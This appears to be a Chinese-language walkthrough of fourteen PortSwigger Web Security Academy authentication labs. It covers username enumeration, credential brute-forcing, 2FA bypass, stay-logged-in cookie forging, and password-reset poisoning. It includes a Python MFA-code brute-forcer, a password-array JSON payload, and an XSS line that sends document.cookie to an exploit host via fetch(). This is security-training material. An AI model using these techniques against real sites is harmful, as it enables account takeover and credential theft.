[toc]

### 1. Username enumeration via different responses

这个题，直接爆破。

先爆破用户名，会有不同的返回。用户名是`au`。

接下来爆破密码，发现有一个是302跳转，得到密码是`aaaaaa`。

最后登录就可以了。

### 2. Username enumeration via subtly different responses

我直呼好家伙，爆破用户名的时候，有一个的返回没有那个`.`。

别的都是`Invalid username or password.`，就它是`Invalid username or password`。

得到的用户名是`affiliate`。

继续爆破密码，密码是`777777`。

### 3. Username enumeration via response timing

这个输入三次错误，就要等待30分钟，裂开。

我去看了一下官方的payload，用的`X-Forwarded-For`去规避。

然后这个是基于时间的，所以将密码设置的长一些。

使用`pitchfork`去爆破。

在`columns`里面把接收到responce的时间调出来，发现有几个都比较长。

每个都去试一下，发现用户名是`att`，密码是`1qaz2wsx`。

### 4. Broken brute-force protection, IP block

这个要爆破carlos的密码。

这个我是一个正确的`wiener, peter`加两个爆破用的密码。

爆破之前把线程调成1，避免正确和错误的顺序被打乱。

得到密码是：`asdfgh`。

### 5. Username enumeration via account lock

对每一个用户名进行多次爆破。

发现`acceso`爆破太多被锁了。

然后对这个进行密码爆破。

发现有一个没有报错，`chelsea`。

最后等一分钟，登陆。

### 6. Broken brute-force protection, multiple credentials per request

输入这种东西，返回302。

```
{"username":"carlos","password":["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"],"":""}
```

那就用二分法来找到密码。试了半天之后，发现我有问题。

直接用这个登陆不就好了。

### 7. 2FA simple bypass

这个第二个验证其实没有用，在输入了密码之后，就可以进入`/my-ccount`页面。

### 8. 2FA broken logic

输入用户名密码之后，返回了一个报文。

```http
GET /login2 HTTP/1.1
Host: ac251fc31e14f8fb80be465f0050001d.web-security-academy.net
Connection: close
Cookie: verify=wiener; session=wPMsPpgL5oax1kfTcYdEd1vaYnDitVTp


```

可以看到这个cookie有一个`verify=wiener`，猜测我用`carlos`就能登陆他的账户了。

直接改发现不对。而且我发现在发送验证码的时候，如果改成`carlos`之后，就不会向我的邮箱里面发送验证码，猜测应该是发送到了`carlos`的账户。

我又试了几次，发现我可以用上一次的验证码进行这一次的登陆。

然后我就在`/login2`先发了一个给carlos的请求。然后尝试去爆破，爆破了半天，发现太慢了，我就关了。

然后去看了一下官方的解析，发现是爆破，我人傻了。

于是我最后调到了20个线程去跑。还是跑了超级久。

### 9. 2FA bypass using a brute-force attack

这个玩意儿用官方给的教程，只能一个线程的跑，实在是太慢了。

在经历了无数次的卡死（跑70多个就不跑了）之后，我决定用python写代码。

```python
import requests
import re

if __name__ == '__main__':
    url = 'https://aca71f161e03469b800b1b5b00c1006b.web-security-academy.net'
    for i in range(10000):
        se = requests.session()
        re1 = se.get(url + "/login")
        token = r'<input required type="hidden" name="csrf" value="(.*)">'
        pattern = re.compile(token)
        result1 = pattern.findall(re1.text)
        body1 = "csrf={}&username=carlos&password=montoya".format(result1[0])
        re2 = se.post(url + '/login', body1)
        result2 = pattern.findall(re2.text)
        tmp = str(i)
        tmp = '0' * (4 - len(tmp)) + tmp
        body2 = 'csrf={}&mfa-code={}'.format(result2[0], tmp)
        re3 = se.post(url + '/login2', body2)
        print(tmp, end=" :")
        if re3.status_code == 200:
            print("false")
        else:
            print("true", re3.status_code)
            break
    print("FINISH")
```

这个就不会卡死了，但是还是很慢，要跑一万年（半小时200个）。

### 10. Brute-forcing a stay-logged-in cookie

登陆的时候勾选上保持登陆，然后去分析cookie。

然后发现了一串`stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`。

进行base64解码之后，发现是`wiener:51dc30ddc473d43a6011e9ebba6ca770`。

后面那一串感觉像是哈希。然后试了一下，发现是密码`peter`的MD5值。

所以可以用`stay-logged-in=base64('carlos:' + md5($password))`去爆破。

爆破的时候记得把session删了，要不然会自动登录到`wiener`账户。

### 11. Offline password cracking

这个题的`stay-logged-in`形成方式和上面一道题一模一样。

在自己尝试的时候发现在评论区有一个xss，可以爆出自己的cookie。

这里尝试将carlos的cookie发送到exploit上面。

`<script>fetch('https://ace21ff41fd7f8a98023102801690043.web-security-academy.net/' + document.cookie)</script>`

得到了`carlos`的cookie：`secret=IoePSl1sBll7WwZJ4JC7MpGSBgDThLsp;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

直接尝试用这个进行登陆，发现登陆成功。但是不能删除账户。

现在只能用cookie去分析密码了。得到了密码的MD5值是`26323c16d5f4dabff3bb136f2460a943`。

[md5在线解密破解](https://www.cmd5.com/)后，发现密码是`onceuponatime`。

### 12. Password reset broken logic

在改密码的界面，会发现改密码的时候，会把你的账户名和你要修改的密码一起给发送出去。

在这里改变用户名即可。

### 13. Password reset poisoning via middleware

这个题目不知道要怎么改变受害者接收到的邮件，去看了一下官方的payload，发现用的是`X-Forwarded-Host`头。

我添加了这个头，尝试将邮件链接指向我的Exploit：`X-Forwarded-Host: acf41f6d1f709afe8084415101340023.web-security-academy.net`

成功。

### 14. Password brute-force via password change

在这个页面我发现，在两个新密码不一样的时候会报错，如果旧密码对了，会报`s`，如果旧密码没有对，会报`Current password is incorrect`。

```http
POST /my-account/change-password HTTP/1.1
Host: ac871f2c1f1ff81880b61fe400280057.web-security-academy.net
Content-Length: 72
Content-Type: application/x-www-form-urlencoded
Cookie: session=3gekCFM4a0jevFPJuOH8l01Qmez5ZM7G

username=carlos&current-password=§peter§&new-password-1=a&new-password-2=b
```

直接对carlos的密码进行爆破（这里一定要加上自己的cookie，不然会转跳到登陆）。

查看报错信息就好了。发现密码是`cheese`。



